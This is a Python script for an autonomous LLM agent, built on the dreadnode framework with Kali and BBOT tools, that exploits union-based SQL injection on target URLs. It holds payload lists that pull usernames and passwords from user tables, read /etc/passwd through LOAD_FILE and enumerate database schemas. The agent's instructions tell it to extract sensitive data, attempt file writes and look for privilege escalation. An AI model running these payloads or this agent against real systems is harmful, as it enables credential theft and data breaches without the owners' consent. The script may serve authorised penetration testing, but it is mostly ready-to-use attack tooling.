import argparse
import asyncio
import json
import time
import typing as t
from pathlib import Path

from rich.console import Console

import dreadnode as dn
from dreadnode.agent.agent import Agent
from dreadnode.agent.result import AgentResult
from dreadnode.agent.tools.bbot.tool import BBotTool
from dreadnode.agent.tools.kali.tool import KaliTool
from dreadnode.agent.tools.neo4j.tool import Neo4jTool
from dreadnode.agent.tools.oast.tool import OastTool

dn.configure(server=None, token=None, project="union-based-sqli-agent", console=False)

console = Console()

# Union-based SQLi focused payloads
UNION_COLUMN_DETECTION = [
    # Column counting techniques
    "' ORDER BY 1--",
    "' ORDER BY 2--", 
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
    "' ORDER BY 10--",
    "' ORDER BY 20--",
    "' ORDER BY 50--",
    
    # Alternative column counting
    "' GROUP BY 1--",
    "' GROUP BY 2--",
    "' GROUP BY 3--",
    "' GROUP BY 4--",
    "' GROUP BY 5--",
    
    # Union null injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
]

UNION_DATA_EXTRACTION = [
    # Basic union with version/database info
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT version(),NULL,NULL--",
    "' UNION SELECT database(),NULL,NULL--",
    "' UNION SELECT user(),NULL,NULL--",
    "' UNION SELECT current_user(),NULL,NULL--",
    
    # Information schema queries
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--",
    "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
    "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--",
    
    # Common table data extraction
    "' UNION SELECT username,password,NULL FROM users--",
    "' UNION SELECT login,pass,NULL FROM admin--",
    "' UNION SELECT email,password,NULL FROM accounts--",
    "' UNION SELECT name,value,NULL FROM config--",
    
    # File reading (MySQL)
    "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
    "' UNION SELECT LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts'),NULL,NULL--",
    
    # Advanced data extraction
    "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
]

UNION_ERROR_PATTERNS = [
    # Column count mismatch errors
    "the used select statements have a different number of columns",
    "column count doesn't match",
    "operand should contain 1 column",
    "each union query must have the same number of columns",
    "number of columns in select list must match",
    "column count mismatch",
    "different number of expressions",
]

@dn.task(name="Union-Based SQLi Analysis", label="analyze_union_sqli")
async def analyze_union_based_sqli(finding_data: dict) -> dict:
    """Analyze a finding specifically for union-based SQL injection."""
    agent = create_union_based_sqli_agent()
    
    url = finding_data.get('data', {}).get('url', '')
    host = finding_data.get('data', {}).get('host', '')
    description = finding_data.get('data', {}).get('description', '')
    
    param_name = extract_param_name(description)
    original_value = extract_original_value(description)
    
    console.print(f"[*] Testing UNION-BASED SQL injection on {host}")
    console.print(f"    URL: {url}")
    console.print(f"    Parameter: {param_name}")
    
    # Build focused prompt with union-specific context
    prompt = f"""Target: {url}
Parameter: {param_name}
Original Value: {original_value}

MISSION: Test this parameter specifically for UNION-BASED SQL injection vulnerabilities.

UNION SQLI METHODOLOGY:
1. COLUMN COUNT ENUMERATION:
   - Use ORDER BY technique to determine column count
   - Start with ORDER BY 1, increment until error
   - Alternative: Use GROUP BY for column counting
   - Document exact error message when count exceeded

2. UNION NULL INJECTION:
   - Once column count known, test UNION SELECT with NULLs
   - Match exact number of columns from enumeration
   - Confirm union query executes without errors
   - Test data type compatibility

3. DATA EXTRACTION:
   - Replace NULLs with actual data queries
   - Extract database version, name, current user
   - Query information_schema for tables/columns
   - Attempt to extract sensitive data from tables

4. ADVANCED TECHNIQUES:
   - Use GROUP_CONCAT for multiple row results
   - Test file reading with LOAD_FILE() (MySQL)
   - Try INTO OUTFILE for file writing (if writable)
   - Test for privilege escalation opportunities

Focus ONLY on union-based techniques. Look for successful data extraction via UNION SELECT.

Test payloads systematically, starting with column enumeration then progressing to data extraction."""

    result = await agent.run(prompt)
    
    # Process results with union-specific logic
    column_count = extract_column_count(result)
    has_union_sqli = analyze_union_responses(result)
    extracted_data = extract_union_data(result)
    
    dn.log_metric("union_sqli_found", 1 if has_union_sqli else 0)
    dn.log_metric("column_count_determined", 1 if column_count > 0 else 0)
    dn.log_metric("data_extracted", 1 if extracted_data else 0)
    
    return {
        "url": url,
        "host": host,
        "parameter": param_name,
        "vulnerability_type": "union_based_sqli",
        "has_sqli": has_union_sqli,
        "column_count": column_count,
        "extracted_data": extracted_data,
        "analysis": result.messages[-1].content if result.messages else None,
        "detection_method": "union_select_data_extraction"
    }

def extract_column_count(result: AgentResult) -> int:
    """Extract determined column count from agent analysis."""
    if not result.messages:
        return 0
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Look for column count mentions
    import re
    column_patterns = [
        r'column count is (\d+)',
        r'(\d+) columns detected',
        r'order by (\d+) successful',
        r'union with (\d+) columns',
        r'table has (\d+) columns'
    ]
    
    for pattern in column_patterns:
        match = re.search(pattern, content)
        if match:
            return int(match.group(1))
    
    return 0

def analyze_union_responses(result: AgentResult) -> bool:
    """Analyze agent responses for union-based SQLi indicators."""
    if not result.messages:
        return False
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Check for union-based SQLi success indicators
    union_indicators = [
        'union select successful',
        'union injection confirmed',
        'column count determined',
        'data extracted via union',
        'union query executed',
        'information_schema accessed',
        'database version extracted',
        'table names retrieved',
        'column names retrieved',
        'union-based injection',
        'successful union query',
        'data enumeration successful',
        'union select results',
        'schema information extracted'
    ]
    
    return any(indicator in content for indicator in union_indicators)

def extract_union_data(result: AgentResult) -> list:
    """Extract any data that was successfully retrieved via union injection."""
    if not result.messages:
        return []
    
    content = ' '.join([msg.content for msg in result.messages if msg.content])
    extracted = []
    
    # Look for common data extraction patterns
    if 'database version' in content.lower():
        extracted.append('database_version')
    if 'database name' in content.lower():
        extracted.append('database_name')
    if 'table names' in content.lower():
        extracted.append('table_names')
    if 'column names' in content.lower():
        extracted.append('column_names')
    if 'user data' in content.lower() or 'username' in content.lower():
        extracted.append('user_data')
    if 'file contents' in content.lower():
        extracted.append('file_contents')
    
    return extracted

def create_union_based_sqli_agent() -> Agent:
    """Create a union-based SQL injection specialist agent."""
    tools = [KaliTool(), BBotTool(), Neo4jTool()]
    
    union_sqli_context = """
UNION-BASED SQL INJECTION SPECIALIST

You are an expert focused EXCLUSIVELY on union-based SQL injection techniques.

Your mission is to exploit SQL injection through UNION SELECT statements to directly extract data.

Follow this adaptive approach:

1. DISCOVER COLUMN STRUCTURE: Determine how many columns the original query returns
2. VALIDATE UNION COMPATIBILITY: Ensure your UNION queries execute without errors
3. EXTRACT DATA SYSTEMATICALLY: Pull database information, schema details, and actual data
4. ADAPT TO CONSTRAINTS: Work around filtering, data type mismatches, and other obstacles

The key insight: union-based injection gives you direct data access. Start simple and build complexity based on what works.

Each application will behave differently. Some block certain keywords, others have data type restrictions, others limit result lengths. Adapt your approach based on the responses you receive.

Use the http_request tool to test union payloads systematically. Let the application responses guide your technique selection.
"""

    return Agent(
        name="union-based-sqli-agent",
        description="Specialized agent for union-based SQL injection detection and exploitation",
        model="gpt-4-turbo",
        tools=tools,
        instructions=union_sqli_context,
    )

def extract_param_name(description: str) -> str:
    """Extract parameter name from BBOT finding description."""
    if "Name: [" in description:
        start = description.find("Name: [") + 7
        end = description.find("]", start)
        return description[start:end] if end > start else "unknown"
    return "unknown"

def extract_original_value(description: str) -> str:
    """Extract original parameter value from BBOT finding description."""
    if "Original Value: [" in description:
        start = description.find("Original Value: [") + 17
        end = description.rfind("]")
        return description[start:end] if end > start else ""
    return ""

async def main():
    parser = argparse.ArgumentParser(description="Union-based SQL injection specialist")
    parser.add_argument("finding_file", type=Path, help="JSON file containing SQLi findings")
    parser.add_argument("--debug", action="store_true", help="Debug mode")
    
    args = parser.parse_args()
    
    with dn.run("union-based-sqli-hunt"):
        console.print("Starting UNION-BASED SQL injection analysis...")
        
        try:
            with open(args.finding_file) as f:
                findings = json.load(f)
            
            if not isinstance(findings, list):
                findings = [findings]
            
            confirmed_count = 0
            data_extracted_count = 0
            
            for finding in findings:
                analysis_result = await analyze_union_based_sqli(finding)
                
                if analysis_result["has_sqli"]:
                    confirmed_count += 1
                    column_count = analysis_result["column_count"]
                    extracted_data = analysis_result["extracted_data"]
                    
                    console.print(f"[+] UNION-BASED SQLi CONFIRMED: {analysis_result['host']}")
                    console.print(f"    Column count: {column_count}")
                    console.print(f"    Data extracted: {', '.join(extracted_data) if extracted_data else 'None'}")
                    
                    if extracted_data:
                        data_extracted_count += 1
                else:
                    console.print(f"[-] No union-based SQLi: {finding.get('data', {}).get('host')}")
            
            dn.log_metric("total_union_sqli_confirmed", confirmed_count)
            dn.log_metric("successful_data_extraction", data_extracted_count)
            
            console.print(f"\nUnion-based SQLi Summary:")
            console.print(f"  Total confirmed: {confirmed_count}")
            console.print(f"  Successful data extraction: {data_extracted_count}")
            
        except Exception as e:
            console.print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())